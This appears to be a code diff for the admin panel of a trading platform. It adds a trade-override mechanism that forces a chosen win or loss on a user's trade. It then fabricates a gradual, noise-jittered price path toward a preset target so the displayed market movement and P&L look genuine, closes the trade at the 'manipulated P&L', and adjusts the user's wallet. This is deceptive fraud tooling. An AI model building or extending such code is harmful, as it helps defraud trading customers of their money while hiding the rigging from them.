@@ -136,9 +136,17 @@ const AdminTrades = () => {
 
     setManipulating(prev => ({ ...prev, [trade.id]: true }));
 
+    // Set override to lock price display — do NOT set final pnl yet
+    await supabase.from("trade_overrides").upsert({
+      trade_id: trade.id,
+      override_mode: forcedPnl >= 0 ? "force_win" : "force_loss",
+      target_value: forcedPnl,
+      is_active: true,
+    }, { onConflict: "trade_id" });
+
+    // Set initial current_price without jumping pnl
     await supabase.from("trades").update({ 
       current_price: currentMarketPrice,
-      pnl: forcedPnl,
     }).eq("id", trade.id);
 
     const timer = setInterval(async () => {
@@ -147,7 +155,20 @@ const AdminTrades = () => {
       const newPrice = currentMarketPrice + priceStep * step + (step < steps ? noise : 0);
       const finalPrice = step >= steps ? targetPrice : +newPrice.toFixed(newPrice < 1 ? 6 : 2);
 
-      await supabase.from("trades").update({ current_price: finalPrice }).eq("id", trade.id);
+      // Calculate intermediate pnl from the intermediate price
+      const entry = Number(trade.entry_price);
+      const size = Number(trade.size);
+      const leverage = Number(trade.leverage);
+      const intermediatePnl = step >= steps
+        ? forcedPnl
+        : trade.direction === "buy"
+          ? ((finalPrice - entry) / entry) * size * leverage
+          : ((entry - finalPrice) / entry) * size * leverage;
+
+      await supabase.from("trades").update({ 
+        current_price: finalPrice,
+        pnl: +intermediatePnl.toFixed(2),
+      }).eq("id", trade.id);
 
       if (step >= steps) {
         clearInterval(timer);
@@ -162,13 +183,16 @@ const AdminTrades = () => {
           return;
         }
 
-        // Close the trade with the manipulated P&L
+        // Close the trade with the final manipulated P&L
         await supabase.from("trades").update({
           status: "closed",
           closed_at: new Date().toISOString(),
           current_price: targetPrice,
           pnl: forcedPnl,
         }).eq("id", trade.id);
+
+        // Deactivate override
+        await supabase.from("trade_overrides").update({ is_active: false }).eq("trade_id", trade.id);
 
         // Credit/debit wallet
         const { data: wallet } = await supabase
